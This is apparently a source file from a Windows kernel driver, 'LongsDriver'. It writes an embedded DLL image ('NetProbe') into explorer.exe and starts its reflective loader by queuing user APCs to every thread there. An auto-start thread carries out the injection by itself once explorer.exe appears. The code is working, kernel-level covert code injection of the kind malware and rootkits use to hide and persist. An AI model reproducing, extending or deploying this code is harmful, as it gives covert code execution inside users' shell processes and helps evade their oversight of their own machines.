#include "NetProbeInject.h"
#include "ApcInject.h"
#include "NetProbeImage.h"
#include "PeImage.h"
#include "ProcessLookup.h"
#include "RemoteInject.h"
#include "Shared.h"

//
// Completion record the target's ReflectiveLoader writes once it is running.
// Mirrored in NetProbe/src/ReflectiveLoader.c. The page also holds a claim word
// the loader uses to make sure only one of the threads that received the APC
// actually maps. The injector polls the record before releasing the raw image,
// because freeing that image while the loader is still executing out of it
// would fault the target.
//
#define RL_STATUS_MAGIC_OFFSET 4
#define RL_STATUS_MAGIC 0x4E504C52UL
#define RL_STATUS_OFFSET_BASE 8

#define RL_STATUS_POLL_MS 100
#define RL_STATUS_MAX_POLLS 100 /* 10 seconds */

static KEVENT g_AutoStop;
static PETHREAD g_AutoThread;
static volatile LONG g_AutoStarted;
static volatile LONG g_AutoFinished;

//
// Runs the reflective load once and reports every step through DbgPrint so the
// whole sequence is readable from WinDbg without a debugger breakpoint.
//
NTSTATUS NetProbeInjectIntoProcess(ULONG TargetPid) {
  const UCHAR *image;
  SIZE_T imageSize = 0;
  PE_EXPORT_LOCATION location;
  PVOID remoteBase = NULL;
  SIZE_T remoteSize = 0;
  PVOID statusBase = NULL;
  SIZE_T statusSize = 16;
  ULONG queued = 0;
  NTSTATUS status;
  ULONG poll;

  image = NetProbeImageData(&imageSize);
  if (image == NULL || imageSize == 0) {
    DbgPrint("[LongsDriver] NetProbeInject: no embedded image; build the "
             "NetProbe project first.\n");
    return STATUS_DEVICE_CONFIGURATION_ERROR;
  }

  DbgPrint("[LongsDriver] NetProbeInject: embedded image %llu bytes, "
           "resolving %s.\n",
           (ULONGLONG)imageSize, NETPROBE_REFLECTIVE_EXPORT);

  status = PeFindExportByName(image, imageSize, NETPROBE_REFLECTIVE_EXPORT,
                              &location);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] NetProbeInject: export %s not found, 0x%X.\n",
             NETPROBE_REFLECTIVE_EXPORT, status);
    return status;
  }
  DbgPrint("[LongsDriver] NetProbeInject: %s RVA 0x%X, file offset 0x%X.\n",
           NETPROBE_REFLECTIVE_EXPORT, location.Rva, location.FileOffset);

  //
  // The status page is where the loader reports completion. It is separate
  // from the raw image so the loader can keep writing it after the image is
  // released, and read/write so the target can update it.
  //
  status = RemoteInjectAllocate(TargetPid, &statusSize, PAGE_READWRITE,
                                &statusBase);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] NetProbeInject: status page in pid %lu failed "
             "0x%X.\n",
             TargetPid, status);
    return status;
  }

  status = RemoteInjectImage(TargetPid, image, imageSize, PAGE_EXECUTE_READ,
                             &remoteBase, &remoteSize);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] NetProbeInject: write to pid %lu failed 0x%X.\n",
             TargetPid, status);
    RemoteInjectFree(TargetPid, statusBase);
    return status;
  }

  //
  // The loader runs from the raw copy at base + file offset. That offset, not
  // the RVA, is what addresses the bytes the driver wrote.
  //
  {
    PVOID routine = (PUCHAR)remoteBase + location.FileOffset;
    DbgPrint("[LongsDriver] NetProbeInject: raw image at %p, loader at %p, "
             "status %p.\n",
             remoteBase, routine, statusBase);

    status = ApcInjectQueueToProcess(TargetPid, routine, statusBase, &queued);
    if (!NT_SUCCESS(status)) {
      DbgPrint("[LongsDriver] NetProbeInject: APC queue to pid %lu failed "
               "0x%X.\n",
               TargetPid, status);
      RemoteInjectFree(TargetPid, remoteBase);
      RemoteInjectFree(TargetPid, statusBase);
      return status;
    }
  }

  if (queued == 0) {
    DbgPrint("[LongsDriver] NetProbeInject: pid %lu had no thread to receive "
             "the APC.\n",
             TargetPid);
    RemoteInjectFree(TargetPid, remoteBase);
    RemoteInjectFree(TargetPid, statusBase);
    return STATUS_NOT_FOUND;
  }

  DbgPrint("[LongsDriver] NetProbeInject: queued to %lu threads; waiting for "
           "loader completion.\n",
           queued);

  //
  // Poll the status page until the loader publishes its record. A thread that
  // never reaches an alertable wait leaves the APC queued and never writes it,
  // so this is bounded and the regions are left in place on timeout rather than
  // freed out from under a loader that may still run later.
  //
  for (poll = 0; poll < RL_STATUS_MAX_POLLS; poll++) {
    ULONG magic = 0;
    LARGE_INTEGER interval;

    interval.QuadPart = -((LONGLONG)RL_STATUS_POLL_MS * 1000 * 10);
    KeDelayExecutionThread(KernelMode, FALSE, &interval);

    if (NT_SUCCESS(RemoteInjectRead(
                       TargetPid,
                       (PUCHAR)statusBase + RL_STATUS_MAGIC_OFFSET, &magic,
                       sizeof(magic))) &&
        magic == RL_STATUS_MAGIC) {
      ULONG_PTR mappedBase = 0;
      ULONG step = 0;

      RemoteInjectRead(TargetPid,
                       (PUCHAR)statusBase + RL_STATUS_OFFSET_BASE,
                       &mappedBase, sizeof(mappedBase));
      RemoteInjectRead(TargetPid, (PUCHAR)statusBase + 12, &step,
                       sizeof(step));

      DbgPrint("[LongsDriver] NetProbeInject: loader completed, mapped base "
               "%p, fail step %lu.\n",
               (PVOID)mappedBase, step);

      //
      // Deliberately do not release remoteBase or statusBase here.
      //
      // The loader was queued as a user APC to every thread of the target, and
      // most of those threads are not alertable at the moment this returns.
      // Their APCs are still pending, and each one will jump into remoteBase
      // (and touch statusBase) when its thread next reaches an alertable wait.
      // Freeing either region now makes that jump land in unmapped memory and
      // takes the target process down - which is exactly what an earlier
      // version did, and why the shell disappeared after a single probe.
      //
      // There is no reliable way to cancel a user APC that has already been
      // dequeued for delivery, so the regions stay. They are small (the image
      // plus one page) and one pair per injected process, and a late APC now
      // finds the claim already taken and returns harmlessly.
      //
      DbgPrint("[LongsDriver] NetProbeInject: raw region %p and status page "
               "%p kept resident for pending APCs.\n",
               remoteBase, statusBase);
      return STATUS_SUCCESS;
    }
  }

  DbgPrint("[LongsDriver] NetProbeInject: no completion after %lu ms; regions "
           "left in pid %lu.\n",
           (ULONG)RL_STATUS_MAX_POLLS * RL_STATUS_POLL_MS, TargetPid);
  return STATUS_IO_TIMEOUT;
}

//
// Waits for the shell, then runs the load once. Sleeping first covers both
// cases the driver can start in: loaded late, when explorer is already up, and
// loaded early, before the shell exists.
//
static VOID NetProbeAutoWorker(PVOID Context) {
  LARGE_INTEGER delay;
  ULONG attempt;

  UNREFERENCED_PARAMETER(Context);

  DbgPrint("[LongsDriver] NetProbeAuto: worker started, waiting for "
           "explorer.exe.\n");

  delay.QuadPart = -2 * 1000 * 1000 * 10; /* 2 seconds */
  KeDelayExecutionThread(KernelMode, FALSE, &delay);

  for (attempt = 0; attempt < 30; attempt++) {
    LARGE_INTEGER now;
    ULONG pid = 0;
    NTSTATUS status;

    now.QuadPart = 0;
    if (KeWaitForSingleObject(&g_AutoStop, Executive, KernelMode, FALSE,
                              &now) == STATUS_SUCCESS) {
      DbgPrint("[LongsDriver] NetProbeAuto: stop requested.\n");
      break;
    }

    status = FindExplorerProcessId(&pid);
    if (NT_SUCCESS(status) && pid != 0) {
      DbgPrint("[LongsDriver] NetProbeAuto: explorer.exe pid %lu found, "
               "injecting.\n",
               pid);
      status = NetProbeInjectIntoProcess(pid);
      DbgPrint("[LongsDriver] NetProbeAuto: load result 0x%X.\n", status);
      break;
    }

    DbgPrint("[LongsDriver] NetProbeAuto: explorer.exe not up yet "
             "(attempt %lu, status 0x%X).\n",
             attempt + 1, status);

    delay.QuadPart = -1 * 1000 * 1000 * 10; /* 1 second */
    KeDelayExecutionThread(KernelMode, FALSE, &delay);
  }

  InterlockedExchange(&g_AutoFinished, 1);
  PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS NetProbeInjectInitialize(VOID) {
  KeInitializeEvent(&g_AutoStop, NotificationEvent, FALSE);
  return ApcInjectInitialize();
}

NTSTATUS NetProbeInjectAutoStart(VOID) {
  HANDLE handle = NULL;
  PETHREAD thread = NULL;
  NTSTATUS status;

  if (InterlockedCompareExchange(&g_AutoStarted, 1, 0) != 0)
    return STATUS_SUCCESS;

  status = PsCreateSystemThread(&handle, THREAD_ALL_ACCESS, NULL, NULL, NULL,
                                NetProbeAutoWorker, NULL);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] NetProbeAuto: PsCreateSystemThread failed "
             "0x%X.\n",
             status);
    return status;
  }

  status = ObReferenceObjectByHandle(handle, THREAD_ALL_ACCESS, *PsThreadType,
                                     KernelMode, (PVOID *)&thread, NULL);
  if (NT_SUCCESS(status)) {
    g_AutoThread = thread;
  } else {
    DbgPrint("[LongsDriver] NetProbeAuto: ObReferenceObjectByHandle failed "
             "0x%X.\n",
             status);
  }

  ZwClose(handle);
  return STATUS_SUCCESS;
}

VOID NetProbeInjectCleanup(VOID) {
  if (g_AutoThread != NULL) {
    LARGE_INTEGER timeout;

    KeSetEvent(&g_AutoStop, IO_NO_INCREMENT, FALSE);

    //
    // The worker is short-lived but can be mid-poll for a target loader, so the
    // wait is generous. If it times out the thread is still running and the
    // driver image must not go away; the mapped path never unloads, so this is
    // only reachable in a test load.
    //
    timeout.QuadPart = -30 * 1000 * 1000 * 10; /* 30 seconds */
    KeWaitForSingleObject(g_AutoThread, Executive, KernelMode, FALSE,
                          &timeout);

    ObDereferenceObject(g_AutoThread);
    g_AutoThread = NULL;
  }

  ApcInjectCleanup();
}